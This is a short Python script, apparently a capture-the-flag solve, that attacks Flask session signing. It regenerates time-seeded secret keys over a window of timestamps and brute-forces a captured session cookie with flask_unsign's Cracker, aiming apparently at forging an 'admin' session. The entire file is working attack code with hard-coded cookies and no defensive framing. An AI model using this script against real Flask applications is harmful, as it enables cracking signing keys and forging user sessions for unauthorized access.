import random
import os
import time

SECRET_OFFSET = 0 # REDACTED
r = round((time.time() + SECRET_OFFSET) * 1000)
print(r)
random.seed(r)
secret  = "".join([hex(random.randint(0, 15)) for x in range(32)]).replace("0x", "")

#secret = '19cd5ebeec814578d61358086bae10b6'

import zipfile
from flask import (Flask, flash, redirect, render_template, request, abort,
                   send_from_directory, session)
app = Flask(__name__)
app.config["SECRET_KEY"] = secret

@app.route("/validity")
def do():
    
    session["test"] = "otherTest"
    return "blah"

#app.run()
token = {"test": "otherTest"}
import itsdangerous
auth = itsdangerous.URLSafeSerializer(secret, "auth")

key = "eyJhZG1pbiI6bnVsbCwidWlkIjoiYWRtaW4ifQ.Y8IosA.nhoOb0cdvqJqViVkbbhRi4WEGS8"
key = "eyJ0ZXN0Ijoib3RoZXJUZXN0In0.Y8Inyw.JYZm5TGSkPiJnoeFF1dpBgPUHNQ"

likelyStartTime = time.time() - 604800

ind = key.index(".")
print(ind)
cookie = {"admin": None, "uid": "admin"}

likely = []
offset = 0

#checked from ~ - 604800 to (-604800 + 38000)
#-24000 -> -5000
def strings():
    i = 0
    t = round((time.time() -2000)) * 1000
    while True:
        #print(t+i)
        random.seed(t + i)
        secret = "".join([hex(random.randint(0, 15)) for x in range(32)]).replace("0x", "")
        yield secret
        i+=1
#for s in strings():
#    pass
from flask_unsign import Cracker
c = Cracker(key, chunk_size = 30000)
c.crack(strings())
        
